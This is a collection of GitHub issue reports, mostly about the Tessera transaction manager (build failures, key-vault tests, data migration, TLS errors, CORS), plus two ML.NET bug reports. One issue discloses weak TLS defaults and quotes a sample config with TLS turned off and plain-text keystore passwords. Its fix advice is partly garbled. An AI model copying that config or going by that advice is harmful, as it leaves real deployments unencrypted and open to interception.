[ERROR] Errors: 
[ERROR]   JaxbConfigFactoryTest.cantAppendToPasswordFileThrowsError:88 » FileAlreadyExists
[INFO] 
[ERROR] Tests run: 342, Failures: 2, Errors: 1, Skipped: 0
[INFO] 
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Summary:
[INFO] 
[INFO] tessera 0.11-SNAPSHOT .............................. SUCCESS [  3.078 s]
[INFO] shared ............................................. SUCCESS [  7.700 s]
[INFO] argon2 ............................................. SUCCESS [  8.117 s]
[INFO] tests .............................................. SUCCESS [  0.712 s]
[INFO] test-util .......................................... SUCCESS [  0.784 s]
[INFO] service-locator .................................... SUCCESS [  0.790 s]
[INFO] service-locator-api ................................ SUCCESS [  1.030 s]
[INFO] encryption ......................................... SUCCESS [  0.797 s]
[INFO] encryption-api ..................................... SUCCESS [  4.075 s]
[INFO] encryption-jnacl ................................... SUCCESS [  3.594 s]
[INFO] config ............................................. FAILURE [ 13.325 s]
[INFO] cli ................................................ SKIPPED
[INFO] cli-api ............................................ SKIPPED
[INFO] key-vault .......................................... SKIPPED
[INFO] key-vault-api ...................................... SKIPPED
[INFO] key-generation ..................................... SKIPPED
[INFO] config-cli ......................................... SKIPPED
[INFO] security ........................................... SKIPPED
[INFO] server ............................................. SKIPPED
[INFO] server-api ......................................... SKIPPED
[INFO] server-utils ....................................... SKIPPED
[INFO] jersey-server ...................................... SKIPPED
[INFO] jaxrs-client-unixsocket ............................ SKIPPED
[INFO] enclave ............................................ SKIPPED
[INFO] enclave-api ........................................ SKIPPED
[INFO] tessera-data ....................................... SKIPPED
[INFO] tessera-admin ...................................... SKIPPED
[INFO] test-utils ......................................... SKIPPED
[INFO] mock-service-locator ............................... SKIPPED
[INFO] tessera-partyinfo .................................. SKIPPED
[INFO] tessera-core ....................................... SKIPPED
[INFO] tessera-jaxrs ...................................... SKIPPED
[INFO] jaxrs-client ....................................... SKIPPED
[INFO] admin-cli .......................................... SKIPPED
[INFO] service-locator-spring ............................. SKIPPED
[INFO] common-jaxrs ....................................... SKIPPED
[INFO] tessera-dist ....................................... SKIPPED
[INFO] tessera-launcher ................................... SKIPPED
[INFO] tessera-grpc ....................................... SKIPPED
[INFO] grpc ............................................... SKIPPED
[INFO] grpc-api ........................................... SKIPPED
[INFO] grpc-service ....................................... SKIPPED
[INFO] grpc-server ........................................ SKIPPED
[INFO] admin-jaxrs ........................................ SKIPPED
[INFO] mock-jaxrs ......................................... SKIPPED
[INFO] sync-jaxrs ......................................... SKIPPED
[INFO] transaction-jaxrs .................................. SKIPPED
[INFO] thirdparty-jaxrs ................................... SKIPPED
[INFO] enclave-server ..................................... SKIPPED
[INFO] enclave-jaxrs ...................................... SKIPPED
[INFO] azure-key-vault .................................... SKIPPED
[INFO] hashicorp-key-vault ................................ SKIPPED
[INFO] tessera-app ........................................ SKIPPED
[INFO] tessera-simple ..................................... SKIPPED
[INFO] tessera-grpc-dist .................................. SKIPPED
[INFO] config-migration ................................... SKIPPED
[INFO] ddls ............................................... SKIPPED
[INFO] acceptance-test .................................... SKIPPED
[INFO] jmeter-test ........................................ SKIPPED
[INFO] websockets-server .................................. SKIPPED
[INFO] encryption-kalium .................................. SKIPPED
[INFO] data-migration ..................................... SKIPPED
[INFO] mock-websocket-container ........................... SKIPPED
[INFO] tessera-sync 0.11-SNAPSHOT ......................... SKIPPED
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 45.127 s
[INFO] Finished at: 2019-09-30T16:26:48-05:00
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:3.0.0-M3:test (default-test) on project config: There are test failures.
[ERROR] 
[ERROR] Please refer to /tessera/config/target/surefire-reports for the individual test results.
[ERROR] Please refer to dump files (if any exist) [date].dump, [date]-jvmRun[N].dump and [date].dumpstream.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException
[ERROR] 
[ERROR] After correcting the problems, you can resume the build with the command
[ERROR]   mvn <goals> -rf :config
root@production:/tessera# 
 Sometimes when using `tessera -keygen -keygenvaulttype AZURE ...` the following message is printed to the console:
```
WARNING: A connection to <vault-url> was leaked. Did you forget to close a response body? To see where this was allocated, set the OkHttpClient logger level to FINE: Logger.getLogger(OkHttpClient.class.getName()).setLevel(Level.FINE);
```

Functionality does not appear to be affected but this msg does not concern the user so should be resolved or hidden. AKV tests are currently disabled for jdk11 as Tessera throws a `javax.net.ssl.SSLPeerUnverifiedException: Hostname localhost not verified (no certificates)` when trying to communicate with the mock AKV (WireMock) server used in the tests.

Travis's `oraclejdk11` is currently `jdk11.0.2`.  The test is reproducible locally when using `jdk11.0.2`.  When using later versions (e.g. `jdk11.0.4`) the tests pass successfully.  

This is a recognised issue with okhttp (used by the AKV client) and `jdk11.0.2` (https://github.com/square/okhttp/issue s/4703).  For further info see https://bugs.openjdk.java.net/browse/JDK-8211806 and https://bugs.openjdk.java.net/browse/JDK-8212885.  

Manual testing verifies that the AKV functionality works as expected in jdk11.0.2 so this appears to be an issue only when using the mock server/self-signed certs in the acceptance tests.  

Potential solutions include:

* Investigate the TLS handshake between the AKV client and WireMock server (see openjdk issues linked above)
* Wait for Travis to update to use a newer version of jdk11
* Manually install a later version of jdk11 for the AKV tests
* Try with a different mock server 
 The version of Vault used in the acceptance tests is `1.0.1`.  The current latest version is `1.2.2`.  The acceptance tests should use a more recent version of Vault to be more representative of an expected environment. Acceptance test coverage should be added for the retrieval of existing and generation of new keys in Azure Key Vaults, similar to the existing tests for the Hashicorp Vault functionality.

The tests should not have a dependency on Azure itself so will ideally mock the AKV in some way. hello guys, I looked for checks on already outdated protocols and size keys that have already known attacks and have not found a proper handling in the default settings. 

# The problem. 

There is no secure default setting. So an attacker can deliberately create a weak configuration to intercept data. [Man-in-the-middle](https://www.cloudflare.com/learning/security/threats/man-in-the-middle-attack/)
as reported in the [RFC6176](https://tools.ietf.org/html/rfc6176#section-2) 


#### the source code vulnerable {sample}

````
    "server": {
        "port": 8080,
        "hostName": "http://localhost",
        "bindingAddress": "http://localhost:9001",
        "sslConfig": {
            **"tls": "OFF",**
            "generateKeyStoreIfNotExisted": "false",
            "serverKeyStore": "./ssl/server1-keystore",
            "serverKeyStorePassword": "quorum",
            "serverTrustStore": "./ssl/server-truststore",
            "serverTrustStorePassword": "quorum",
            "serverTrustMode": "CA",
            "clientKeyStore": "./ssl/client1-keystore",
            "clientKeyStorePassword": "quorum",
            "clientTrustStore": "./ssl/client-truststore",
            "clientTrustStorePassword": "quorum",
            "clientTrustMode": "CA",
            "knownClientsFile": "./ssl/knownClients1",
            "knownServersFile": "./ssl/knownServers1"
        }
    },
````
*reference: [in project](https://github.com/jpmorganchase/tessera/blob/master/config/src/test/resources/sample_full.json#L13)

**### Note¹:** I am aware that this is just sample code, but I found no check for weak protocols.

## verified files.

ALL 
956 directories, 1162 files

#### arquives relevent in scope:

`./cli/admin-cli/src/test/resources/sample-config.json
./cli/cli-api/src/test/resources/sample-config.json
./cli/config-cli/src/main/java/com/quorum/tessera/config/cli/DefaultCliAdapter.java
./cli/config-cli/src/main/java/com/quorum/tessera/config/cli/parsers/KeyGenerationParser.java
./cli/config-cli/src/test/java/com/quorum/tessera/config/cli/OverrideUtilTest.java
./cli/config-cli/src/test/java/com/quorum/tessera/config/cli/parsers/KeyGenerationParserTest.java
./cli/config-cli/src/test/resources/keygen-sample.json
./cli/config-cli/src/test/resources/keytests/passwordsMissing.json
./cli/config-cli/src/test/resources/keytests/passwordsWrong.json
./cli/config-cli/src/test/resources/keytests/pubPrivInlineLocked.json
./cli/config-cli/src/test/resources/keytests/pubPrivInlineUnlocked.json
./cli/config-cli/src/test/resources/keytests/pubPrivPasswordsFile.json
./cli/config-cli/src/test/resources/keytests/pubPrivUsingPathsLocked.json
./cli/config-cli/src/test/resources/keytests/pubPrivUsingPathsUnlocked.json
./cli/config-cli/src/test/resources/keytests/pubPrivUsingPathsUnlocked_missingPrivateKey.json
./cli/config-cli/src/test/resources/keytests/pubPrivUsingPathsUnlocked_missingPublicKey.json
./cli/config-cli/src/test/resources/sample-config-invalidpath.json
./cli/config-cli/src/test/resources/sample-config.json
./config-migration/src/main/java/com/quorum/tessera/config/builder/ConfigBuilder.java
./config-migration/src/main/java/com/quorum/tessera/config/migration/LegacyCliAdapter.java
./config-migration/src/main/java/com/quorum/tessera/config/migration/LegacyOverridesMixin.java
./config-migration/src/main/java/com/quorum/tessera/config/migration/TomlConfigFactory.java
./config-migration/src/test/java/com/quorum/tessera/config/builder/ConfigBuilderTest.java
./config-migration/src/test/java/com/quorum/tessera/config/migration/LegacyCliAdapterTest.java
./config-migration/src/test/java/com/quorum/tessera/config/migration/test/FixtureUtil.java
./config-migration/src/test/java/com/quorum/tessera/config/migration/TomlConfigFactoryTest.java
./config-migration/src/test/resources/sample-all-values.conf
./config-migration/src/test/resources/sample.conf
./config-migration/src/test/resources/sample-no-keys.conf
./config-migration/src/test/resources/sample-toml-no-nulls.conf
./config-migration/src/test/resources/sample-toml-no-nulls-tls-off.conf
./config-migration/src/test/resources/sample-with-only-private-keys.conf
./config-migration/src/test/resources/sample-with-only-public-keys.conf
./config/src/main/java/com/quorum/tessera/config/constraints/SslConfigValidator.java
./config/src/main/java/com/quorum/tessera/config/HashicorpKeyVaultConfig.java
./config/src/main/java/com/quorum/tessera/config/InfluxConfig.java
./config/src/main/java/com/quorum/tessera/config/ServerConfig.java
./config/src/main/java/com/quorum/tessera/config/SslConfig.java
./config/src/test/java/com/quorum/tessera/config/constraints/SslConfigValidatorTest.java
./config/src/test/java/com/quorum/tessera/config/HashicorpKeyVaultConfigTest.java
./config/src/test/java/com/quorum/tessera/config/InfluxConfigTest.java
./config/src/test/java/com/quorum/tessera/config/ServerConfigTest.java
./config/src/test/resources/keypassupdate/newLockedKeyAddInline.json
./config/src/test/resources/keypassupdate/newLockedKeyAddInlineWithExisting.json
./config/src/test/resources/keypassupdate/newLockedKeyAddToFile.json
./config/src/test/resources/keypassupdate/newLockedKeyNoPasswordsSet.json
./config/src/test/resources/keypassupdate/newLockedKeyWithUnlockedPrevious.json
./config/src/test/resources/keypassupdate/nullKeys.json
./config/src/test/resources/mask-fixture.json
./config/src/test/resources/mask-fixture-with-private-key-path.json
./config/src/test/resources/sample_full.json
./config/src/test/resources/sample.json
./config/src/test/resources/sample-private-keygen.json
./.git/index
./.git/objects/pack/pack-258a9f17f6b04ecf1915b60c870b51a87ef57947.idx
./.git/objects/pack/pack-258a9f17f6b04ecf1915b60c870b51a87ef57947.pack
./harquives.txt
./key-vault/hashicorp-key-vault/src/main/java/com/quorum/tessera/key/vault/hashicorp/HashicorpKeyVaultServiceFactoryUtil.java
./key-vault/hashicorp-key-vault/src/test/java/com/quorum/tessera/key/vault/hashicorp/HashicorpKeyVaultServiceFactoryUtilTest.java
./README.md
./security/src/main/java/com/quorum/tessera/ssl/context/ClientSSLContextFactoryImpl.java
./security/src/main/java/com/quorum/tessera/ssl/context/ServerSSLContextFactoryImpl.java
./security/src/main/java/com/quorum/tessera/ssl/context/SSLContextBuilder.java
./security/src/main/java/com/quorum/tessera/ssl/util/TlsUtils.java
./security/src/test/java/com/quorum/tessera/ssl/context/SSLContextBuilderTest.java
./security/src/test/java/com/quorum/tessera/ssl/util/TlsUtilsTest.java
./tessera-core/src/test/resources/config1.json
./tessera-core/src/test/resources/config-with-relay.json
./tests/acceptance-test/src/test/java/com/quorum/tessera/test/migration/config/ConfigMigrationSteps.java
./tests/acceptance-test/src/test/java/com/quorum/tessera/test/vault/hashicorp/HashicorpStepDefs.java
./tests/acceptance-test/src/test/resources/features/vault/hashicorp.feature
./tests/acceptance-test/src/test/resources/legacy.toml
./tests/acceptance-test/src/test/resources/vault/hashicorp-tls-config.hcl
./tests/acceptance-test/src/test/resources/vault/tessera-hashicorp-approle-config.json
./tests/acceptance-test/src/test/resources/vault/tessera-hashicorp-config.json
`

#### How to fix it, suggestion 
1 - check the protocol when establishing the connection. 
2 - use keys longer than 64 bits. 
3 - Disable TLSv1, TLSv1.1 and SSLv1 



 Currently we have a `checkstyle.xml` file along with the `maven-checkstyle-plugin`, which will run as part of the CI build and make known any style issues.

The checks can be expanded greatly and will improve code readability and maintainability, and will help keep pull request diff's smaller as auto-formatting between IDE's does not have as much impact.

_Generally_ the checks will be based on IntelliJ default formatting.

- [ ] Apply EmptyLineSeparator checkstyle Tessera version: 0.9

using quorum-example/7nodes example, trying to migrate constellation to tessera, run ./stop.sh to stop the cluster, and use following script to do db migration:

**#!/bin/bash
set -u
set -e

for i in {1..7}
do
    DDIR="qdata/c$i"
    rm -f /home/zhou/go/src/github.com/quorum-examples/examples/7nodes/qdata/c$i/db$i*
    rm -f "$DDIR/tm.ipc"
    java -jar /home/zhou/go/src/github.com/tessera/data-migration/target/data-migration-0.9-SNAPSHOT-cli.jar -storetype dir -inputpath /home/zhou/go/src/github.com/quorum-examples/examples/7nodes/qdata/c$i/storage/payloads -dbuser sa -dbpass  -exporttype h2 -outputfile /home/zhou/go/src/github.com/quorum-examples/examples/7nodes/qdata/c$i/db$i
done**

then restart the cluster with tessera: ./istanbul-start.sh tessera
Got this error: **Internal Exception: org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory<too much connection>**

I don't know why there are too much connections, so I reboot the machine to clear them. Then restart the cluster again, both geth and tessera started, and seems tessera has connected to each other:
**➜  7nodes git:(master) ✗ netstat -an|grep 9001
tcp6       0      0 127.0.0.1:9001          :::*                    LISTEN
tcp6       0      0 127.0.0.1:9001          127.0.0.1:44998         ESTABLISHED
tcp6       0      0 127.0.0.1:44996         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:44922         ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:44996         ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:44948         ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:37252         ESTABLISHED
tcp6       0      0 127.0.0.1:44948         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:45026         ESTABLISHED
tcp6       0      0 127.0.0.1:44998         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:44922         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:45026         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:37252         127.0.0.1:9001          ESTABLISHED
tcp6       0      0 127.0.0.1:9001          127.0.0.1:44962         ESTABLISHED
tcp6       0      0 127.0.0.1:44962         127.0.0.1:9001          ESTABLISHED**

but blocknumber was parked at 2, and tessera log shows below:
**Call: SELECT ENCODED_PAYLOAD, TIMESTAMP, HASH FROM ENCRYPTED_TRANSACTION WHERE (HASH = ?)
        bind => [1 parameter bound]
Query: ReadAllQuery(referenceClass=EncryptedTransaction sql="SELECT ENCODED_PAYLOAD, TIMESTAMP, HASH FROM ENCRYPTED_TRANSACTION WHERE (HASH = ?)")
07:31:10.218 [jersey-server-managed-async-executor-1] ERROR c.q.t.a.e.DefaultExceptionMapper - Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.7.3.v20180807-4be1041): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: org.h2.jdbc.JdbcSQLException: Column "TIMESTAMP" not found; SQL statement:
SELECT ENCODED_PAYLOAD, TIMESTAMP, HASH FROM ENCRYPTED_TRANSACTION WHERE (HASH = ?) [42122-197]
Error Code: 42122**

I don't know if anyone else has succeed in migrating from constellation to tessera, and there better have a official sample.


 In current 0.11-SNAPSHOT master (not in previous releases) the CLI password prompt always appears when starting a node with locked keys, even when `passwordFile` is provided and is the path to a correct password file.

> Note: Issue #935 is to remove the ability for `passwords` to be provided in the configfile.  Currently this occurs silently, resulting in any passwords provided as `"passwords": [...]` to be simply ignored.  This may cause confusion as it will result in the same behaviour described above even though this is currently the expected behaviour.  
> 
> #935 is currently still in progress.  When complete, it will be made explicit that the `passwords` field is no longer supported so that overlap with this issue will not occur. Tessera:v0.9.2
openjdk:java 8
OS:Ubuntu 18.04

Hello.
I got the error below when I started tessera nodes.There are 2 tessera nodes.
`
15:52:16.464 [pool-2-thread-1] ERROR c.q.tessera.node.PartyInfoPoller - Error thrown while executing poller.
javax.ws.rs.ProcessingException: javax.net.ssl.SSLHandshakeException: java.security.cert.CertificateException: This address has been associated with a different certificate
        at org.glassfish.jersey.client.internal.HttpUrlConnector.apply(HttpUrlConnector.java:284) ~[tessera.jar:na]
        at org.glassfish.jersey.client.ClientRuntime.invoke(ClientRuntime.java:278) ~[tessera.jar:na]
        at org.glassfish.jersey.client.JerseyInvocation.lambda$invoke$0(JerseyInvocation.java:753) [~[tessera.jar:na]]
...
`

configulation json file is below
[tessera01_TLS.json.txt](https://github.com/jpmorganchase/tessera/files/3480308/tessera01_TLS.json.txt)
[tessera02_TLS.json.txt](https://github.com/jpmorganchase/tessera/files/3480362/tessera02_TLS.json.txt)

 For example if starting a node with the incorrect url provided for a remote enclave the node fails to start with the following error:
```
com.quorum.tessera.config.apps.TesseraApp: Provider com.quorum.tessera.p2p.P2PRestApp could not be instantiated
```

This should be changed so that it is more descriptive and allows for the problem to be diagnosed and resolved.

(This behaviour was present pre-0.10.0) If Sonatype or Travis are experiencing technical issues, the "deploy only" stage often exceeds the Travis 50min job time limit causing valid master builds to fail.  Up until 0.7 tessera has been released as a self executing uber jar. With the addition of different key vault implementations and protocol options the artefacts are well tailored to specific use cases. Additionally some organisations might prefer deploying applications a spring boot applications others may even want to deploy on jee runtimes. 

Provide some examples projects that compose the tessera libraries in different ways.


 We are using tessera for execute private transaction's in Quorum. When invoking the third party (privateURL) API from the postman, we are getting expected output. but when we are calling the same API's from the another server we getting empty response with 200 status code( http://:9081/storeraw). This issue is happening due to the CORS. we checked with File:/// it's working.

How to enable CORS for tessera third party API's? When data-migration.jar utility is executed against the payloads directory of constellation, an `Exception in thread "main" java.lang.OutOfMemoryError: Java heap space` occurs, in case the data size is significantly higher than the heap memory allocated to the java process. This occurs due to all the files being loaded in memory before starting the migration.

Command:

`java -Xmx<max-memory-allocated> -jar <dir>/data-migration.jar -storetype dir -inputpath <path-to-payloads>/ -dbuser quorum -dbpass quorum -outputfile /quorum/tessera/data -exporttype h2`

Stacktrace:

> Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
> at java.nio.file.Files.read(Files.java:3099)
> at java.nio.file.Files.readAllBytes(Files.java:3158)
> at com.quorum.tessera.data.migration.FilesDelegate.readAllBytes(FilesDelegate.java:18)
> at com.quorum.tessera.data.migration.DirectoryStoreFile.lambda$load$2(DirectoryStoreFile.java:26)
> at com.quorum.tessera.data.migration.DirectoryStoreFile$$Lambda$5/1587487668.apply(Unknown Source)
> at java.util.stream.Collectors.lambda$toMap$58(Collectors.java:1321)
> at java.util.stream.Collectors$$Lambda$8/1702297201.accept(Unknown Source)
> at java.util.stream.ReduceOps$3ReducingSink.accept(ReduceOps.java:169)
> at java.util.Iterator.forEachRemaining(Iterator.java:116)
> at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801)
> at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:481)
> at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471)
> at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708)
> at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
> at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:499)
> at com.quorum.tessera.data.migration.DirectoryStoreFile.load(DirectoryStoreFile.java:24)
> at com.quorum.tessera.data.migration.CmdLineExecutor.execute(CmdLineExecutor.java:107)
> at com.quorum.tessera.data.migration.Main.main(Main.java:11)

And in some cases (it is most likely when the max heap memory allocated is quite low ~ 128m)

> Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
> at org.apache.commons.codec.binary.BaseNCodec.resizeBuffer(BaseNCodec.java:173)
> at org.apache.commons.codec.binary.BaseNCodec.ensureBufferSize(BaseNCodec.java:190)
> at org.apache.commons.codec.binary.Base32.decode(Base32.java:296)
> at org.apache.commons.codec.binary.BaseNCodec.decode(BaseNCodec.java:321)
> at org.apache.commons.codec.binary.BaseNCodec.decode(BaseNCodec.java:306)
> at com.quorum.tessera.data.migration.DirectoryStoreFile.lambda$load$1(DirectoryStoreFile.java:25)
> at com.quorum.tessera.data.migration.DirectoryStoreFile$$Lambda$4/769287236.apply(Unknown Source)
> at java.util.stream.Collectors.lambda$toMap$58(Collectors.java:1320)
> at java.util.stream.Collectors$$Lambda$8/1702297201.accept(Unknown Source)
> at java.util.stream.ReduceOps$3ReducingSink.accept(ReduceOps.java:169)
> at java.util.Iterator.forEachRemaining(Iterator.java:116)
> at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801)
> at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:481)
> at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471)
> at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708)
> at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
> at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:499)
> at com.quorum.tessera.data.migration.DirectoryStoreFile.load(DirectoryStoreFile.java:24)
> at com.quorum.tessera.data.migration.CmdLineExecutor.execute(CmdLineExecutor.java:107)
> at com.quorum.tessera.data.migration.Main.main(Main.java:11) Provide ability for enclave to update / append key pairs realtime. I have built a network with say 3 peers where each peer contains a tessera and geth running.
I have added admin.addPeer(), raft.addPeer() and also passed the detail in tessera-config.json.

Now after having all the peers set up, I wish to add 1 more peer.
What should be the step to do that? Do I need to stop all Tessera running in the previous machines to add the new peer?
<---------->
134892705
Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/install
Operating System: windows

I have two version of VS 2017 installed, pro and enterprise. Enterprise is not updated to the version required by the extension and so it is unchecked by default. So far it all makes sense.

Installation fails with the message that "the operation was not successful for all the selected products."

Opening the install log, I see that it was trying to install to the unchecked Enterprise version.

Here's a snippet from the log file:

2019-05-13 4:52:18 PM - The extension with ID 'FE96D051-645F-4309-AE99-107A776B0DA2' is not installed to Visual Studio Professional 2017.
2019-05-13 4:52:18 PM - Found installed product - Visual Studio Enterprise 2017 (2)
2019-05-13 4:52:18 PM - The extension with ID 'FE96D051-645F-4309-AE99-107A776B0DA2' is not installed to Visual Studio Enterprise 2017 (2).
2019-05-13 4:52:18 PM - Extension cannot be installed to the following products due to missing prerequisites:
2019-05-13 4:52:18 PM - 	Visual Studio Enterprise 2017 (2)
2019-05-13 4:52:18 PM - 		-------------------------------------------------------
2019-05-13 4:52:18 PM - 		Identifier   : Microsoft.NetCore.ComponentGroup.DevelopmentTools.2.1
2019-05-13 4:52:18 PM - 		Name         : .NET Core 2.1 development tools
2019-05-13 4:52:18 PM - 		Version      : [15.0,17.0)
2019-05-13 4:52:18 PM - 		Error        : The prerequisite specified does not exist
2019-05-13 4:52:18 PM - 
2019-05-13 4:52:50 PM - InstallProgressPage ChangeType: 'SingleInstall' operationCount: '2' Text: 'Installing ...'
2019-05-13 4:52:50 PM - The following target products have been selected...
2019-05-13 4:52:50 PM - 	Visual Studio Professional 2017
 Hello, I am facing the following issue when attempting to train a model:

```
Inferring Columns ...
Creating Data loader ...
Loading data ...
Exploring multiple ML algorithms and settings to find you the best model for ML task: binary-classification
For further learning check: https://aka.ms/mlnet-cli
|     Trainer                              Accuracy      AUC    AUPRC  F1-score  Duration #Iteration             |
[Source=AutoML, Kind=Trace] Channel started
[Source=AutoML, Kind=Trace] Evaluating pipeline xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=AveragedPerceptronBinary{}  cache=+
[Source=AutoML, Kind=Error] Pipeline crashed: xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=AveragedPerceptronBinary{}  cache=+ . Exception: System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
[Source=AutoML, Kind=Trace] 1	NaN	00:00:00.3095729	xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=AveragedPerceptronBinary{}  cache=+
|1    AveragedPerceptronBinary                  NaN      NaN      NaN       NaN       0.3          0             |
System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
[Source=AutoML, Kind=Trace] Evaluating pipeline xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=SdcaLogisticRegressionBinary{}  cache=+
[Source=AutoML, Kind=Error] Pipeline crashed: xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=SdcaLogisticRegressionBinary{}  cache=+ . Exception: System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
[Source=AutoML, Kind=Trace] 2	NaN	00:00:00.5833636	xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} xf=Normalizing{ col=Features:Features} tr=SdcaLogisticRegressionBinary{}  cache=+
|2    SdcaLogisticRegressionBinary              NaN      NaN      NaN       NaN       0.6          0             |
System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
